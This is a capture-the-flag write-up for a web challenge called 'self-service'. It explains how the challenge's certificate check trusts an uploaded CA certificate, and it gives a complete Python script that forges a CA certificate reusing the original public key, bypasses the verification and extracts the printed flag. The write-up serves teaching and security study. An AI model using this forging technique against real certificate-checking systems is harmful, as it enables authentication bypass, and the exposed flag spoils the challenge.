# self-service

[library.m0unt41n.ch/challenges/self-service](https://library.m0unt41n.ch/challenges/self-service) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

We get a CA app, that generates an expired-on-purpose CA certificate and uses it
to generate an otherwise valid client certificate. The purpose is to send back
a client/CA certificate pair, that will pass the internal verification against
that expired cert. We exploit weak CA certificate checking, by piecing together
a forged CA certificate.

# The app

Startup

*   `generate_key()`: Generates a random, secure RSA key at boot
*   `generate_expired_ca()`: Generates a CA certificate, with expiration date of `T - 1 day`
*   `generate_client()`: Generates a valid client certicate, signed by that CA

Then, the app presents a Web UI, where we can:

*   `/client.pem`: get above client cert
*   `/ca.pem`: get above CA cert
*   `/cert`: upload a CA / client cert pair, that will be verified against those internally stored ones
*   `/party`: show a meme &#128578;

# The verification

```python
def check_cert_valid(ca_cert: crypto.X509, client_cert: crypto.X509) -> bool:
    store = crypto.X509Store()
    store.add_cert(ca_cert)
    ctx = crypto.X509StoreContext(store, client_cert)
    ctx.verify_certificate()

@app.route("/cert", methods=["POST"])
def page_cert():
    try:
        ca_cert = from_pem(request.files["ca"].read().decode("utf-8"))
        client_cert = from_pem(request.files["client"].read().decode("utf-8"))
        check_cert_valid(ca_cert, client_cert)

        expected_ca_key = crypto.dump_publickey(crypto.FILETYPE_PEM, gen_ca_cert.get_pubkey())
        actual_ca_key = crypto.dump_publickey(crypto.FILETYPE_PEM, ca_cert.get_pubkey())
        if ca_cert.get_subject().CN == "SelfService Legacy Root CA" and client_cert.get_subject().CN == "seppli@self-service.local" and expected_ca_key == actual_ca_key:
            return render_template("response.html", maybe_the_flag=open("flag.txt", "r").read())
        else:
            return render_template("response.html", maybe_the_flag="Almost")
    except Exception as e:
        return render_template("response.html", maybe_the_flag="Got an error: " + str(e))
```

So, overall, we need a **CA certificate** that:

*   Is valid (i.e. not expired)
*   has CN of "SelfService Legacy Root CA"
*   has **public key** of the original certificate, so that:
    *   `check_cert_valid()` passes
    *   `expected_ca_key==actual_ca_key` check passes passes
*   has all the other things in order (that it's a CA certificate, that it's self-signed, etc)

... and a **client** certificate that:

*   has CN of `seppli@self-service.local`
*   can be verified with the uploaded certificate

# Bypassing the verification

My first attempt was to create a certificate **bundle**, containing both original bad cert and
a new, correct one, that would verify a client certificate I created. The problem with that is
that `crypto.load_certificate(()` (and then, `store.add_cert()`) only use the first certificate
in the PEM file.

But then, I made key observation: the app **trusts** the CA certificate we upload, without
further verification (e.g. in `X509StoreContext.verify_certificate()`). Certificate is added
to context and, as long as it is syntactically valid, the app is going to use its pubkey.

Which brings an idea: 

*   Generate a new, **valid** CA certificate, with as much data as possible copied from
    the original one
*   ... in particular, with a cloned public key
*   Then, self-sign it, send it back to the server, along with the original client cert

This should pass all the checks.

# Solution script

```python
from OpenSSL import crypto
import requests
import re

URL="http://localhost:5000"

# Grab the certificate pair from the server
orig_ca_pem = requests.get(URL+"/ca.pem").text
orig_client_pem = requests.get(URL+"/client.pem").text
orig_ca_cert = crypto.load_certificate(crypto.FILETYPE_PEM, orig_ca_pem)

# Create a new cert and set the fixed parts
new_ca_cert = crypto.X509()
new_ca_cert.set_version(2)
new_ca_cert.gmtime_adj_notBefore(0)
new_ca_cert.gmtime_adj_notAfter(365*24*60*60)
new_ca_cert.set_serial_number(420)

# Copy parts of the original cert that are used for verification
new_ca_cert.set_subject(orig_ca_cert.get_subject())
new_ca_cert.set_issuer(orig_ca_cert.get_issuer())
new_ca_cert.set_pubkey(orig_ca_cert.get_pubkey())

# ... and extensions too (incl. CA-specific stuff)
ext = [ orig_ca_cert.get_extension(i)
        for i in range(orig_ca_cert.get_extension_count()) ]
new_ca_cert.add_extensions(ext)

# Sign it
new_private_key = crypto.PKey()
new_private_key.generate_key(crypto.TYPE_RSA, 4096)
new_ca_cert.sign(new_private_key, 'sha512')

new_ca_pem = crypto.dump_certificate(crypto.FILETYPE_PEM,
                                     new_ca_cert).decode('utf-8')

# Send both certificates back to the app
client_bytes = orig_client_pem.encode('ascii')
ca_bytes = new_ca_pem.encode('ascii')
resp = requests.post(URL+"/cert",
                     files={
                       'ca': ('ca.pem', ca_bytes),
                       'client': ('client.pem', client_bytes)
                     })

# Pick the flag from the HTTP response &#128578;
r = re.compile('shc2021{[^}]*}')
print(r.findall(resp.text)[0])
```

This worked both locally and remotely.

---

## `shc2021{do_y0u_tru5t_y0ur_r00ts?}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
